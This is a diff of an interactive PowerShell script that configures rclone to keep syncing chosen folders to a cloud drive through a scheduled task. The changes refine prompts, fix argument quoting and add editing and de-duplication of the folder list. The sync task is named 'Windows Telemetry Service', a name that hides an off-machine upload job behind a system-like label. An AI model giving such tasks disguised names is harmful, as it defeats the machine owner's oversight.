@@ -9,28 +9,6 @@ $rclonetask = "Windows Telemetry Service"
 $wrapperdestination = "$rootpath\RcloneWrapper.ps1"
 #----Variables end.
 
-#----Global functions start here.
-#Function to add a/b variants to a scenerio.
-function Get-YesOrNo {
-    param (
-        [string]$fillervar
-    )
-    do {
-        $datain = Read-Host "Do you want to modify(if previously mod, then may be more mod required?) $fillervar file? (y/n)"
-    } while ($datain -ne "y" -and $datain -ne "n")
-    return $datain
-}
-#Function to get folder path and add additional folders to ledger.
-function Get-FolderPath {
-    do {
-        $destination = Read-Host "Please provide destination path (folder path)"
-        if (-not (Test-Path $destination)) {
-            Write-Host "The specified folder does not exist. Please provide a valid folder path."
-        }
-    } while (-not (Test-Path $destination))
-    return $destination
-}
-#----Functions end.
 #----Main script begins here.
 #Cleanup
 $TaskName = "Cleanup?"
@@ -96,26 +74,36 @@ if ([string]::IsNullOrEmpty($option)) {
     Start-Sleep -Seconds 1
     $option = "n"
 }
-if ($option.ToLower() -eq "y") {  
+if ($option.ToLower() -eq "y") { 
     $fillervar = "rc.conf"
+    function Get-YesOrNo {
+        param (
+            [string]$fillervar
+        )
+        do {
+            $datain = Read-Host "Do you want to create new $fillervar file? (y/n)"
+        } while ($datain -ne "y" -and $datain -ne "n")
+        return $datain
+    } 
+
     if (Test-Path $rcloneconfigfile) {
-        $viewOldFile = Read-Host "The rc.conf file already exists. Do you want to view its contents? (yes/no)"
-        if ($viewOldFile -eq "yes") {
+        $viewOldFile = Read-Host "The rc.conf file already exists. Do you want to view its contents? (y/n)"
+        if ($viewOldFile -eq "y") {
             Write-Host "Contents of rc.conf file:"
             Get-Content $rcloneconfigfile
             do {
                 $continue = Get-YesOrNo -fillervar $fillervar
-                if ($continue -eq "no") {
+                if ($continue -eq "n") {
                     Write-Host "Continuing without creating a new file."
                     exit
                 }
-            } while ($continue -ne "yes")
+            } while ($continue -ne "y")
         }
         else {
             Write-Host "Continuing without viewing the old file."
         }
     }
-    if ($continue -eq "yes" -or -not (Test-Path $rcloneconfigfile)) {
+    if ($continue -eq "y" -or -not (Test-Path $rcloneconfigfile)) {
         $token = Read-Host "Please enter your token:"
         $rcConfContent = @"
 [remsync]
@@ -149,7 +137,7 @@ $pathforcloud = "$($trimmedSerial)-$($systemnametrimmed)"
 function SyncWithRclone {
     $syncDirectories = Get-Content $ledgerpath
     foreach ($directory in $syncDirectories) {
-        & $rcloneexe --config $rcloneconfig sync "$directory" "${clouddrive}:$pathforcloud --max-size 10M"
+        & $rcloneexe --config $rcloneconfig sync "$directory" "${clouddrive}:$pathforcloud" --max-size 10M
     }
 }
 while ($true) {
@@ -168,31 +156,79 @@ if ([string]::IsNullOrEmpty($option)) {
     $option = "n"
 }
 if ($option.ToLower() -eq "y") {  
-    $fillervar = "SyncLedger"
+    $taskRunning = Get-ScheduledTask | Where-Object { $_.TaskName -eq $rclonetask -and $_.State -eq "Running" }
+    if ($taskRunning) {
+        Write-Host "Stopping task: $rclonetask"
+        Stop-ScheduledTask -TaskName $rclonetask
+    }
+    function Remove-Duplicates {
+        param(
+            [string[]]$Array
+        )
+        $Array | Select-Object -Unique
+    }
     if (Test-Path $syncledgerfile) {
         Write-Host "A syncledger file already exists."
         Get-Content $syncledgerfile
-        $continue = Read-Host "Do you want to continue with creating a new file and deleting the old file? (y/n)"
-        if ($continue -eq "n") {
-            Write-Host "Continuing without creating a new file."
-        } else {
-            Write-Host "Creating a new file and deleting the old file..."
-            if ($continue -eq "y" -or -not (Test-Path $syncledgerfile)) {
+    
+        do {
+            $choice = Read-Host "Type 'a' to amend existing file, 'n' to create a new one, or 'e' to exit. (a/n/e)"
+            if ($choice -eq "n") {
                 $destinations = @()
                 do {
-                    $destination = Get-FolderPath
-                    $destinations += $destination
-                    $choice = Get-YesOrNo -fillervar $fillervar
-                } while ($choice -eq "y")
-                $destinations | ForEach-Object {
-                    $_ -replace '\\', '/' | Out-File -FilePath $syncledgerfile -Append -Encoding UTF8
+                    $destination = Read-Host "Enter the new path (type 'e' to exit)"
+                    if ($destination -ne "e") {
+                        $destinations += $destination
+                    } else {
+                        break
+                    }
+                } while ($true)
+                $destinations = Remove-Duplicates -Array $destinations
+                $destinations | Set-Content -Path $syncledgerfile
+                Write-Host "New syncledger file has been created at: $syncledgerfile"
+                break
+            } elseif ($choice -eq "e") {
+                Write-Host "Exiting the script."
+                break
+            } elseif ($choice -eq "a") {
+                $destinations = Get-Content $syncledgerfile
+                do {
+                    $destination = Read-Host "Enter the new path (type 'e' to exit)"
+                    if ($destination -ne "e") {
+                        $destinations += $destination
+                    } else {
+                        $destinations = Remove-Duplicates -Array $destinations
+                        $destinations | Set-Content -Path $syncledgerfile
+                        Write-Host "Syncledger file has been updated."
+                        break
+                    }
+                } while ($true)
+                if ($destination -ne "e") {
+                    $destinations = Remove-Duplicates -Array $destinations
+                    $destinations | Set-Content -Path $syncledgerfile
+                    Write-Host "Syncledger file has been updated."
+                } else {
+                    Write-Host "Exiting the script."
+                    break
                 }
-                Write-Host "Syncledger file has been created at: $syncledgerfile"
+            } else {
+                Write-Host "Invalid choice. Please enter 'a', 'n', or 'e'."
             }
-        }
+        } while ($true)
     } else {
         Write-Host "The syncledger file does not exist."
+        $destinations = @()
+        do {
+            $destination = Read-Host "Enter the path"
+            $destinations += $destination
+            $choice = Read-Host "Do you want to add another path? (y/n)"
+        } while ($choice -eq "y")
+        $destinations = Remove-Duplicates -Array $destinations
+        $destinations | Set-Content -Path $syncledgerfile
+        Write-Host "Syncledger file has been created at: $syncledgerfile"
     }
+    Write-Host "Starting task: $rclonetask"
+    Start-ScheduledTask -TaskName $rclonetask    
 } else {}
 
 #Windows Task Creation for rclone continuous sync.
